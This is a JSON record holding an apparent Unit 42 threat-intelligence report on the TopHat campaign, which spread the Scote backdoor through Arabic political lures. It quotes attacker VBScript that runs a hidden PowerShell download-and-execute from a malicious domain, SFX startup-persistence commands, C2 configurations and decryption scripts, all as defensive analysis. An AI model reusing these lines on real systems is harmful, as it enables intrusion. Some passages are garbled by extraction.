{
    "id": "127a7ec7-8989-4b70-a810-5f2b6ddf070a",
    "created_at": "2023-01-12T15:02:24.184501Z",
    "updated_at": "2025-03-27T02:06:06.202996Z",
    "deleted_at": null,
    "sha1_hash": "efaa532e0ae91c06491ff11f14e7e65dfaf17ab9",
    "title": "2018-01-26 - The TopHat Campaign- Attacks Within The Middle East Region Using Popular Third-Party Services",
    "authors": "",
    "file_creation_date": "2022-05-28T02:13:51Z",
    "file_modification_date": "2022-05-28T02:13:51Z",
    "file_size": 2389219,
    "plain_text": "# The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third- Party Services\n\n**[researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/](https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/)**\n\nJosh Grunzweig January 26, 2018\n\nBy [Josh Grunzweig](https://unit42.paloaltonetworks.com/author/joshgruznweig/)\n\nJanuary 26, 2018 at 5:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [Core,](https://unit42.paloaltonetworks.com/tag/core/) [DustySky,](https://unit42.paloaltonetworks.com/tag/dustysky/) [Palestinian Territories,](https://unit42.paloaltonetworks.com/tag/palestinian-territories/) [Scote,](https://unit42.paloaltonetworks.com/tag/scote/) [TopHat](https://unit42.paloaltonetworks.com/tag/tophat/)\n\nSummary\n\nIn recent months, Palo Alto Networks Unit 42 observed a wave of attacks leveraging popular third-party services Google+, Pastebin, and bit.ly.\nAttackers used Arabic language decoy documents related to current events within the Palestine Territories as lures to entice victims to open\nand subsequently be infected by the malware. There is data indicating that these attacks are targeting individuals or organizations within the\nPalestinian Territories, which is detailed later.\n\nThe attacks themselves are deployed via four different means, two involving malicious RTF files, one involving self-extracting Windows\nexecutables, and the final using RAR archives.\n\nThe ultimate payload is a new malware family that we have dubbed “Scote” based on strings we found within the malware samples. Scote\nprovides backdoor access for an attacker and we have observed it collecting command and control (C2) information from Pastebin links as\nwell as Google+ profiles. The bit.ly links obscured the C2 URLs so victims could not evaluate the legitimacy of the final site prior to clicking it.\nWe are calling their recent activity the “TopHat” campaign.\n\nAdditionally, we tracked the apparent author testing their malware against numerous security products. Our tracking of this testing enabled us\nto both note changes made over time as well as to observe other malware being submitted by the author. This other malware submitted\n[provided overlaps with the previously reported DustySky campaign. In addition to testing malicious RTFs that deploy the Scote malware family,](http://www.clearskysec.com/dustysky/)\nthe same attacker was witnessed submitting files that appear to be new variants of the DustySky Core malware discussed in their report.\n\nMalware Delivery Techniques\n\nThe attacks we found within the TopHat campaign began in early September 2017. In a few instances, original filenames of the identified\nsamples were written in Arabic. Specifically, we found the following names during this investigation:\n\n**Original Filename** **Translation**\n\nاﻟﺮﺋﯿﺲ ﯾﺒﺪا ﺑﺤﻞ اﻟﺴﻠﻄﺔ.rar The president begins dissolving power.rar\n\nاﻟﺮﺋﯿﺲ ﯾﺒﺪا ﺑﺤﻞ اﻟﺴﻠﻄﺔ.scr The president begins dissolving power.scr\n\nﻣﺤﻀﺮ اﺟﺘﻤﺎع اﻟﯿﻮم.doc Minutes of today's meeting.doc\n\nWe observed a series of techniques used to deploy the Scote malware family. To date, at a high level, we have observed the following four\ntechniques, each of which we delve into in this blog:\n\n\n-----\n\n_Figure 1 Malware delivery techniques_\n\nTechnique #1 – RTFs Leveraging Bit.ly\nThe first technique encountered included the use of malicious RTFs that made a HTTP request to the below URL which then redirected to the\nbelow malicious site (note the intentional typo of “storage”):\n\n**URL** **Redirect**\n\nhttp://bit[.]ly/2y3XL3P http://storgemydata[.]website/v.dat\n\nThis ‘v.dat’ file was in turn a PE32 executable file that has the following SHA256 hash:\n\nSHA256 862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d5\n\nLooking at the publicly available statistics for the bit[.]ly redirect, we see the majority of activity taking place in late October of this year.\nAdditionally, we see the majority of the downloads originating from both the Palestinian Territories as well as the United Arab Emirates. This\nprovides clues as to who the victims are or where attackers may originate from.\n\n\n-----\n\n_Figure 2 Statistics surrounding malicious redirect_\n\nTechnique #2 – Don’t Kill My Cat Attacks\n\nThe second technique uses an interesting tactic that Unit 42 has not seen before. Specifically, it makes use of an attack discussed in July of\nthis year called Don’t Kill My Cat or DKMC. DKMC can enable an attacker to load a legitimate bitmap (BMP) file that contains shellcode within\n[it. The DKMC tool and more information about this tactic may be found here.](https://github.com/Mr-Un1k0d3r/DKMC)\n\nThis specific attack begins with a malicious executable file that downloads a legitimate BMP file that looks like the following:\n\n_Figure 3 Malicious BMP image retrieved by downloader_\n\nIt should be noted that this is the same image used in the DKMC presentation. It would appear that the attackers simply used the default\nsettings of this particular program.\n\nThis BMP file is loaded as shellcode. The first six bytes are read as the following instructions:\n\n\n1\n2\n3\n\n\nseg000:00000000         inc   edx\nseg000:00000001         dec   ebp\nseg000:00000002         jmp   loc_34D8B\n\n\nCode execution is then redirected to embedded shellcode.\n\nThe underlying shellcode is decrypted at runtime using a 4-byte XOR key of 0x3C0922F0. The shellcode eventually loads an embedded UPXpacked executable and redirects execution to this file. This file is an instance of the Scote malware family. The size of the payload and the fact\nthat it is embedded within the BMP file explains the large amount of distortion witnessed in the image above. In other words, the distortion\nwitnessed is actually the shellcode and the embedded Scote malware. As this data is converted within a BMP image, we’re left with what\nessentially looks like random pixels.\n\nTechnique #3 – RTFs Exploiting CVE-2017-0199.\n\n\n-----\n\ns tec que beg s t a c ous es t at a e use o C 0 0 99 a c oso t O ce/ o d ad e ote code e ecut o ( C )\nvulnerability patched by Microsoft in September 2017. When opened, the following lure is displayed to the victim (translation on the right\nprovided by Google Translate):\n\n_Figure 4 Lure used by malicious RTFs_\n\n[This lure is related to an event reported in late August where President Mahmoud Abbas announced plans to convert a planned presidential](http://indianexpress.com/article/world/palestinians-to-turn-presidential-palace-into-national-library-4816384/)\npalace into a national library. This is consistent with the timeline of the attacks we witnessed, as the event took place roughly a week before we\nobserved these malware samples.\n\nThese RTFs will also download a file from the following location:\n\nstorgemydata[.]website/update-online/office-update.rtf\n\nNote that this is the same domain witnessed in the redirect used in technique #1. While the downloaded file has an RTF extension, it is in fact\na VBScript with the following contents:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n<script language=\"VBScript\">\nwindow.moveTo -4000, -4000\nSet vFwhEtGt = CreateObject(\"Wscript.Shell\")\nSet lfTi = CreateObject(\"Scripting.FileSystemObject\")\nIf 1=1 Then\nvFwhEtGt.Run (\"PowerShell.exe -WindowStyle Hidden $d=$env:userprofile+'\\\\start\nMenu\\\\Programs\\\\Startup\\\\\\12330718701ac441736a55e3ee3cx996.exe';(New-Object\nSystem.Net.WebClient).DownloadFile('http://storgemydata[.]website/x.exe',$d);Start-Process $d;\"),0\nEnd If\nwindow.close()\n</script>\n\n\nThis VBScript script executes a PowerShell command that will download and execute a file from the following location:\n\nhttp://storgemydata[.]website/x.exe\n\nThis final ‘x.exe’ executable file is an instance of the Scote malware family.\n\nTechnique #4 – Self-extracting Executables\n\nThe last technique makes use of self-extracting executable files to both load a decoy document and spawn an instance of Scote. When the\nmalware is run it will drop a file with an original filename of ‘abbas.rtf’, which contains the following contents:\n\n\n-----\n\n_Figure 5 TopHat decoy document with rough translation_\n\nAdditionally, an instance of Scote is loaded on the victim machine.\n\nThe decoy document used discusses the potential dissolving of the Palestinian Authority (PA) by the President Mahmoud Abbas. This\n[particular event was reported on August 23, 2017, just before Trump administration officials were set to visit Ramallah.](https://www.middleeastmonitor.com/20170823-abbas-considers-option-of-dissolving-pa-and-switching-power-to-plo/)\n\nLater in this blog, we will see the attackers leveraging this Donald Trump connection even more.\n\nWe originally witnessed these specific RTFs on September 6, 2017, just two weeks after this event.th\n\nBased on the observed statistics from the malicious redirect found in technique #1, as well as the content of this decoy document, we can infer\nthat at least some of the targeted victims may very well be located in the Palestinian Territories.\n\nAnalysis of the Scote Malware\n\nThe Scote malware family employs a series of techniques and tricks when it is originally loaded onto a victim machine. However, underneath\nthe various layers of obfuscation lies a fairly straightforward malware family that abuses legitimate third-party online services to host its C2\ninformation.\n\nWhen Scote originally is run, it will decode embedded configuration information. This embedded configuration information contains URLs to\nthird party online services, such as Pastebin postings or Google+ accounts. Scote will use this information to attempt to retrieve data from\nthese URLS and parse it, such as in the following example:\n\n_Figure 6 Google+ profile used by Scote malware_\n\nIt should be noted that a total of three Google+ profiles have been observed and all of these profiles contained the name ‘Donald Trump’. This\nis interesting given the topics we saw being used to deliver the Scote malware family within the TopHat campaign, many of which also referred\nto the President of the Palestinian Territories.\n\nAfter C2 information is retrieved by Scote, it will communicate with these servers and can accept commands that perform the following actions:\n\nKill the Scote malware\nRun ‘ipconfig’ on the victim and return results\nRun ‘cmd exe /C systeminfo’ and return results\n\n\n-----\n\noad a t at s do oaded o a C\n\nFor more information about the Scote malware family, please refer to the Appendix.\n\nIdentified Malware Testing Against Security Solutions\nWhen looking at the malicious RTF documents in technique #4 that exploit CVE-2017-0199 we found that all of the files we encountered were\nsubmitted within close succession of each other to an online service that tests them against multiple security products. Additionally, the original\nfilenames of these files implied that an attacker may have been testing their malware against one or more security products.\n\n**SHA256** **Filename** **Date**\n\ncb6cf34853351ba62d4dd2c609d6a41c618881670d5652ffa7ddf5496e4693f0 test1.rtf 2017-09-06 15:00:08 UTC\n\n8a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf64 xx.rtf 2017-09-06 15:00:53 UTC\n\nd302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b5 xx2.rtf 2017-09-06 15:01:49 UTC\n\n1cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a1 xx2.rtf 2017-09-06 15:05:30 UTC\n\nd409d26cffe6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9 xx2.rtf 2017-09-06 15:08:32 UTC\n\naa18b8175f68e8eefa12cd2033368bc1b73ff7caf05b405f6ff1e09ef812803c xx2.rtf 2017-09-06 15:18:14 UTC\n\nAs we can see by the timestamps shown above, the files were submitted anywhere from one to ten minutes apart from each other. Looking\ncloser at these files we can see what changed between iterations.\n\n_Figure 7 Modifications made to RTFs by attacker_\n\nAs it so happens, the first RTF file this attacker attempted to test had very few detections. However, this was due to the fact that the attempts\nat commenting out the backslashes caused this file to not open at all within Microsoft Word. When you attempt to open this file, Word will\nsimply render the content as it would a normal text file.\n\nIt appeared that the attacker realized this, as he or she quickly corrected this, and proceeded to make very minor modifications to try and\nevade security products. However, none of the modifications were terribly effective: all of these samples were found to have a high rate of\ndetection.\n\nAs we can see in Figure 7, the attacker made multiple very small modifications between each iteration, specifically around the\n‘\\object\\objlink\\objupdate’ string. This particular control allows the malicious content to be loaded by the RTF, as outlined in an analysis by\n[MDSec. As such, the attacker likely felt this was what resulted in the RTF being detected as malicious, and attempted to obfuscated it.](https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/)\n\nOverlap with the DustySky Campaign\n\n\n-----\n\nes des be g ab e to t ess t e attac e test g s o e a a e, e ot ced so et g te est g e e e e oo g at t e d dua\nwho submitted these files. About a month and a half after these files were submitted, the same individual submitted the following three\nsamples that we attribute to the [DustySky campaign:](http://www.clearskysec.com/dustysky/)\n\n202d1d51254eb13c64d143c387a87c5e7ce97ba3dcfd12dd202a640439a9ea3b\nd18e09debde4748163efa25817b197f3ff0414d2255f401b625067669e8e571e\n3e4d0ffdde0b5db2a0a526730ff63908cefc9634f07ec027c478c123912554bb\n\nDustySky is a campaign published by ClearSky in January 2016 that discusses a politically motivated group that primarily targets organizations\nwithin the Middle East. The group has remained active since they were originally reported on, including a campaign identified by Unit 42 earlier\nthis year. These files appear to be new variants of the DustySky Core malware discussed in the report and they communicate with the\nfollowing domains over HTTPS:\n\nfulltext.yourtrap[.]com\nchecktest.www1[.]biz\n\nThe malware is dropped via a self-extracting executable, which contains an empty decoy document with the following name:\n\nاﻧﺒﺎء ﻋﻦ اﺣﺘﺠﺎز اﻟﺮﺋﯿﺲ ﻋﺒﺎس ﻓﻲ اﻟﺴﻌﻮدﯾﺔ واﻋﻼن دﺣﻼن رﺋﯿﺴﺎ ﻟﻔﻠﺴﻄﯿﻦ.docx\n\nThis can roughly be translated to the following:\n\nNews of the detention of President Abbas in Saudi Arabia and Dahlan's declaration as President of Palestine.docx\n\nAs we can see, the name of this decoy document is consistent with the lures witnessed in the TopHat campaign.\n\nConclusion\n\nAttackers often are found to leverage current events to accomplish their goal. In the TopHat campaign, we have observed yet another instance\nwhere a threat actor looks to be using political events to target individuals or organizations within the Palestine region. This campaign\nleveraged multiple methods to deploy a previously unseen malware family, including some relatively new tactics in the case of using a\nlegitimate BMP file to load malicious shellcode.\nThe new malware family, which we have dubbed Scote, employs various tricks and tactics to evade detection, but provides relatively little\nfunctionality to the attackers once deployed. This may well be due to the fact it is still under active development. Scote uses some interesting\nmethods when retrieving C2 information, including the use of Pastebin and Google+ accounts, as well as using bit.ly links to obscure the C2\nURLs so victims could not evaluate the legitimacy of the final site prior to clicking it.\nThe TopHat campaign was found to have some overlaps discovered with the previously reported DustySky campaign when the attacker was\nidentified to be submitting their files for testing purposes. Unit 42 will continue to track and monitor this threat and will report on any\ndevelopments that occur.\nPalo Alto Networks customers are protected by this threat in the following ways:\n\nThe [Scote malware family and the TopHat campaign have been tagged within AutoFocus for continued tracking](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Scote)\n[DustySky is tagged within AutoFocus for ongoing tracking](https://autofocus.paloaltonetworks.com/#/tag/Unit42.DustySky)\nAll malicious domains discovered within this campaign have been appropriately flagged as malware\nAll samples are marked malicious within WildFire\nTraps identifies and blocks the exploits used by the RTF files\n\nAdditionally, Google, Pastebin, and bit.ly have been notified of the malicious content being hosted on their services.\n\n**Appendix**\n\nIndicators of Compromise\n\n**SHA256 Hashes**\nd3ead67228b3d7968ac767648b46a8e906affa0ebb5cc69f7acbed475a97204c\n03e2b932c013252fa2eb5e35390f9e21d0ff87e5b1c01683ebce0e8ce9b8d6df\n4df9488fbdfaf5d05fda65175a6b6e5331c58c967adbe972aa46c64b4fd0b1bb\n0dde9940f7896c2e4fb881dd185c3c3db280a9fd2ac2cb81988f43f5b0f6fcf7\n613da5f745c281acbffa4375e96394f8c912f58f92afe347e8a1f10fad3489bb\nd0f2d2d7d82c91fe64a64552e0e6200a096230fb6a64a1307928ae33ab2a5bf8\n7b6347093b27174e27228c2fde7d39e02d57315b354461aaf1dee3f0800fdfc3\nbdc633fe3145d87036ad759be855771d5bb3ca592cecca9ef7f41454d7cf9f05\ned9c62f77055a2498aec681b5653240be534595b97a9d11e92371639b0ca9a48\n7a1fa34ca804492415579c3ed4f505a7f09fcd7bc834590cff86e2ce77c4fc73\n862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d5\n3540c2f0765773fa0a822fcf5fed5ed2a363ad11291a66ab1b488c9a4aa857f9\n\n\n-----\n\nddc 3c8d3d5556 d 8 3d c 8 6 9 cb d0c9 edeb8 a 3033c e0\nd4cb6b76dd352c928ca7184f583d14d800c090ba650dd26d8fa4febe901d1205\n5c0b253966befd57f4d22548f01116ffa367d027f162514c1b043a747bead596\n1f9bca1d5ce5d14d478d32f105b3ab5d15e1c520bde5dfca22324262e84d4eaf\nc9ba9e11a19120b58af1f6ccf3beb25744580592c680718a6fc205d662f2a20e\naa18b8175f68e8eefa12cd2033368bc1b73ff7caf05b405f6ff1e09ef812803c\nd409d26cffe6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9\nd302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b5\n1cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a1\n8a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf64\n3627ed71588c7b55b35592c3b277910041f3d5ff917de721c53684ee18fcda40\n109996d28700fa0e8594d6ecca422418fa43e1b7cf5f9f4442a69264bf5fcea4\nc2815c72c9ea70db073775269ef04b1d061e93580f0f5fd3f3de25601641576a\n\n**Domains**\n\nstorgemydata[.]website\n\nScote Technical Analysis\nFor the technical analysis, we used the following sample:\n\nSHA256 3540c2f0765773fa0a822fcf5fed5ed2a363ad11291a66ab1b488c9a4aa857f9\n\nThis particular sample begins as a self-extracting executable. When run, it will drop a ‘e.exe’ sample and execute the following SFX script\ncommands:\n\n\n1\n2\n3\n4\n5\n\n\nPath=%userprofile%\\start menu\\programs\\startup\\\nSetup=e.exe\nSilent=1\nOverwrite=1\nUpdate=U\n\n\nFor those unfamiliar with SFX commands, the series of commands above is silently deploying e.exe to the startup path. It will overwrite any\ninstances where e.exe already exists in this path.\nThe ‘e.exe’ file is compiled in Delphi and has the following SHA256 hash:\n\nSHA256 9580d15a06cd59c01c59bca81fa0ca8229f410b264a38538453f7d97bfb315e7\n\nWhen run, ‘e.exe’ will periodically decrypt strings at runtime using a simple single-byte XOR routine. While the routine allows for different bytes\nto be used, the author chose to use a key of 0xFF in every observed instance.\nThe malware proceeds to get the address of the NtDelayExecution function from ntdll.dll. This function is used by Sleep to cause a delay in\nprogram execution. After this function address has been resolved, it will overwrite the first five bytes to jmp to a malicious function, as seen\nbelow:\n\n_Figure 8 Modifications to NtDelayExeuction_\n\nThe malware proceeds to make a call to Sleep with an argument of 1, thus redirecting execution to this malicious function. This is likely an\nattempt at thwarting anti-virus and security solutions, however, has the adverse effect of preventing the malware from making subsequent calls\nto Sleep.\n\nThis malicious function continues to decode more strings using the single-byte XOR technique. Additionally, it will copy the following functions\nout of ntdll.dll for later use:\n\nZwCreateUserProcess\n\n\n-----\n\nocate tua e o y\nZwWriteVirtualMemory\nZwGetContextThread\nZwSetContextThread\nZwResumeThread\n\nA large blob of encrypted data is decrypted using a modified version of RC4. The following Python code may be used to decrypt this data. The\nkey has consistently been observed to be “qlNwuFVA9K8HpGNY6x0I”.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nimport base64\nimport binascii\nimport hexdump\nimport sys\ndef rc4_crypt(data, key):\nS = range(256)\nj = 0\nout = []\nfor i in range(256):\nj = (j + S[i] + ord( key[i % len(key)] )) % 256\nS[i], S[j] = S[j], S[i]\ni = 0\nfor char in data:\nj = (S[i % 256] + j) % 256\nt = S[i%256]\nS[i%256] = S[j]\nS[j] = t\nout.append(chr(ord(char) ^ S[(S[i%256] + S[j]) % 256]))\ni += 1\nreturn ''.join(out)\nfile = sys.argv[1]\nf = open(file, 'rb')\nfd = f.read()\nf.close()\noutput = rc4_crypt(fd, \"qlNwuFVA9K8HpGNY6x0I\")\nf = open(\"decrypted_data.bin\",'wb')\nf.write(output)\nf.close()\n\n\nThis decrypted code is then copied to a newly allocated block of memory before execution flow is redirected to it. When this newly decrypted\ncode is called, it is provided with a string argument containing the path to svchost.exe.\nThis new code is shellcode that will eventually decrypt an executable file and inject it into a newly spawned svchost.exe process.\nThe shellcode in question makes certain decisions by the author that demonstrates a lack of sophistication. For example, it will load a series of\nlibraries and functions using a common ROR13 technique. This technique begins with the attacker taking a string of a library or function, such\nas ‘CreateProcessA’, and performing a binary ROR13 against it. In this example, the attacker has a result of a DWORD of 0x16B3FE72. This\nDWORD is then typically hardcoded within the shellcode. The malicious code then iterates through the functions of the necessary library and\napplies the same ROR13 technique against each function until it finds a match.\nThis shellcode uses the same approach, however, instead of providing the hardcoded DWORDs, it instead provides the clear-text library and\nfunction names, which then have the ROR13 applied. The resulting DWORD is then used. Unfortunately, this completely cancels out any\nobfuscation that might have originally been present.\nAfter the various libraries and functions are loaded, the shellcode decodes an embedded blob of data using a multi-byte XOR operation. The\noriginal key for this operation appears to have been ‘Houdini’, however, due to a likely mistake by the author, after the first iteration, a key of\n‘oudini\\x00’ is used instead.\nThe following example Python code decodes this data found within the shellcode:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nimport sys\nfrom itertools import cycle, izip\ndef xor(message, key):\nreturn ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))\ndef decode(data, size):\nout = \"\"\nkey = \"oudini\\x00\"\nb1 = xor(data[0], \"H\")\nb2 = xor(data[1:size], key)\nb = b1 + b2\nfor bite in b:\nout += chr((ord(bite) + 128) & 0xff)\nreturn out\nfile = sys.argv[1]\nf = open(file, 'rb')\nfd = f.read()\nf.close()\nsize = 54272\noutput = decode(fd, size)\nf1 = \"embeddedShellcode.bin\"\nfh = open(f1, 'wb')\nfh.write(output)\nfh.close()\n\n\nThis decoded blob is a Microsoft Windows executable that contains the Scote payload. After this blob is decoded, a new instance of\nsvchost.exe is spawned in a suspended state. The Scote payload is injected into this process prior to resuming it.\nScote begins by loading and decoding an embedded resource string. It is decoded first using base64 with a customized alphabet. The result is\nthen base64-decoded using the traditional alphabet. The following alphabet is used for the first phase of decoding:\n\n0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/\n\nOnce decoded, we’re provided with the following configuration (newlines and spacing added for presentation):\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n[config]\n[connection]\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n[param]http://pastebin[.]com/raw/trZZJTGA[/param]\n[/connection]\n[install_name]e3HGAiPJ[/install_name]\n[nick_name]4c1h7vLX[/nick_name]\n[install_folder]noinstall[/install_folder]\n[reg_startup]false[/reg_startup]\n[folder_startup]false[/folder_startup]\n[task_startup]false[/task_startup]\n[injection]true[/injection]\n[injection_process]svchost[/injection_process]\n\n\nThe configuration is parsed to determine if there are any connection ‘param’ parameters provided. In the event that there are, Scote will\nattempt to download the contents of these URLs via a simple GET request.\nThese pastebin URLs contained the following information, IPs have been defanged:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nscout{\n5.175.214[.]9:22\n5.175.214[.]9:23\n5.175.214[.]9:25\n5.175.214[.]9:53\n5.175.214[.]9:6000\n5.175.214[.]9:80\n}\nelite{\n5.175.214[.]9:5000\n5.175.214[.]9:443\n5.175.214[.]9:1434\n5.175.214[.]9:110\n5.175.214[.]9:2716\n5.175.214[.]9:8080\n}\n{x=c2NvdXR7DQo1LjE3NS4yMTQuOToyMg0KNS4xNzUuMjE0Ljk6MjMNCn0NCmVsaXRlew0KNS4xNzUuMjE0Ljk6NTAwMA0KNS4xNzUu\n\n\nIn addition to Pastebin, some samples were found connecting to the following three Google+ profiles:\n\n\n-----\n\nttps //p us goog e[ ]co / 0 5 8099 50 89969\nhttps://plus.google[.]com/110228699051788231047\nhttps://plus.google[.]com/106456556287604120942\n\nScote takes the response from these requests and parses data within ‘scout{}’. Other Scote versions attempted to identify data contained\nwithin ‘{x=’ and ‘}’. This data is decoded using the traditional Base64 algorithm. The results are similar to the following (IPs have been\ndefanged):\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nscout{\n5.175.214[.]9:22\n5.175.214[.]9:23\n}\nelite{\n5.175.214[.]9:5000\n5.175.214[.]9:443\n}\n\n\nThis information is used for subsequent communication and these values represent the Scote malware’s C2.\nWhile there are a number of other configuration parameters within Scote, the connection params and the nick_name appear to be the only\nones used. It’s possible that Scote is still actively being developed and the author has yet to make use of the additional parameters provided\nwithin the configuration. A full list of identified Scote configurations may be found within the ‘Scote Configurations’ appendix.\nScote checks the current running process against the following list to ensure it is running within one of them:\n\nsvchost.exe\nexplorer.exe\nchrome.exe\nfirefox.exe\niexplorer.exe\nopera.exe\n\nScote makes an ASM call to CPUID with an argument of 1 to query the victim’s processor information and features. This information is used to\ngenerate a unique 8-character hash for that victim.\nScote then connects to the previously retrieved C2 servers and sends the following information via TCP:\ncommand=scote_connection|hwid=[8 character hash]\nIn the example above, [8 character hash] is replaced with the victim’s unique hash. Scote continues to submit the following command\nperiodically and will parse the response:\ncommand=scote_ping\nScote accepts the following five responses:\n\n**Command** **Description**\n\nscote_pong No action taken by Scote\n\nscote_drop Kill the Scote malware\n\nscote_info_ipconfig Return the results of running ‘ipconfig’\n\nscote_info_systeminfo Return the results of running ‘cmd.exe /C systeminfo’\n\nscote_upgrade Accept a DLL from the remote C2 and load it.\n\nWhen Scote returns information in the following format:\ncommand=[command]|buffer=[data]\nIn the example above, [command] is replaced with the command received by the remote C2 server, and [data] is replaced with data that has\nbeen encoded using both traditional base64 as well as base64 with the nonstandard alphabet.\nScote Configurations\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n4df9488fbdfaf5d05fda65175a6b6e5331c58c967adbe972aa46c64b4fd0b1bb\n\n[config]\n[connection]\n[param]https://plus.google[.]com/104518099222750189969[/param]\n[param]https://plus.google[.]com/110228699051788231047[/param]\n[param]https://plus.google[.]com/106456556287604120942[/param]\n[/connection]\n[install_name]Kh237t0P[/install_name]\n[nick_name]k1et333d[/nick_name]\n[install_folder]noinstall[/install_folder]\n\n[reg startup]false[/reg startup]\n\n\n-----\n\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n\n\n\n[ _ p] [ _ p]\n[task_startup]false[/task_startup]\n[injection]true[/injection]\n[injection_process]svchost[/injection_process]\ned9c62f77055a2498aec681b5653240be534595b97a9d11e92371639b0ca9a48\n\n[config]\n[connection]\n[param]https://plus.google[.]com/104518099222750189969[/param]\n[param]https://plus.google[.]com/110228699051788231047[/param]\n[param]https://plus.google[.]com/106456556287604120942[/param]\n[/connection]\n[install_name]Q2xm5ziY[/install_name]\n[nick_name]hq5GyQ1D[/nick_name]\n[install_folder]noinstall[/install_folder]\n[reg_startup]false[/reg_startup]\n[folder_startup]false[/folder_startup\n[task_startup]false[/task_startup]\n[injection]false[/injection]\n613da5f745c281acbffa4375e96394f8c912f58f92afe347e8a1f10fad3489bb\n\n[config]\n[connection]\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n[param]http://pastebin[.]com/raw/trZZJTGA[/param]\n[/connection]\n[install_name]e3HGAiPJ[/install_name]\n[nick_name]4c1h7vLX[/nick_name]\n[install_folder]noinstall[/install_folder]\n[reg_startup]false[/reg_startup]\n[folder_startup]false[/folder_startup]\n[task_startup]false[/task_startup]\n[injection]true[/injection]\n[injection_process]svchost[/injection_process]\n03e2b932c013252fa2eb5e35390f9e21d0ff87e5b1c01683ebce0e8ce9b8d6df\n\n[config]\n[connection]\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n[param]http://pastebin[.]com/raw/trZZJTGA[/param]\n[/connection]\n[install_name]i0c9488I[/install_name]\n[nick_name]7WDyDSog[/nick_name]\n[install_folder]noinstall[/install_folder]\n[reg_startup]false[/reg_startup]\n[folder_startup]false[/folder_startup]\n[task_startup]false[/task_startup]\n[injection]true[/injection]\n[injection_process]svchost[/injection_process]\n0dde9940f7896c2e4fb881dd185c3c3db280a9fd2ac2cb81988f43f5b0f6fcf7\n\n[config]\n[connection]\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n[param]http://pastebin[.]com/raw/trZZJTGA[/param]\n[/connection]\n[install_name]ZVLhWo62[/install_name]\n[nick_name]b04bc9mK[/nick_name]\n[install_folder]noinstall[/install_folder]\n[reg_startup]false[/reg_startup]\n[folder_startup]false[/folder_startup]\n[task_startup]false[/task_startup]\n[injection]true[/injection]\n[injection_process]svchost[/injection_process]\nd0f2d2d7d82c91fe64a64552e0e6200a096230fb6a64a1307928ae33ab2a5bf8\n\n[config]\n[connection]\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n[/connection]\n[install_name]9OhcOo03[/install_name]\n[nick_name]URt7b1zK[/nick_name]\n[install_folder]temp[/install_folder]\n[reg_startup]false[/reg_startup]\n[folder_startup]false[/folder_startup]\n[task_startup]true[/task_startup]\n[injection]true[/injection]\n[injection_process]svchost[/injection_process]\n7b6347093b27174e27228c2fde7d39e02d57315b354461aaf1dee3f0800fdfc3\n\n[config]\n[connection]\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n[/connection]\n\n\n-----\n\n91\n92\n93\n94\n95\n96\n97\n\n\n\n[ _ ] [ _ ]\n[nick_name]3GlWhgi3[/nick_name]\n[install_folder]noinstall[/install_folder]\n[reg_startup]false[/reg_startup]\n[folder_startup]true[/folder_startup]\n[task_startup]false[/task_startup]\n[injection]true[/injection]\n[injection_process]explorer[/injection_process]\n\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
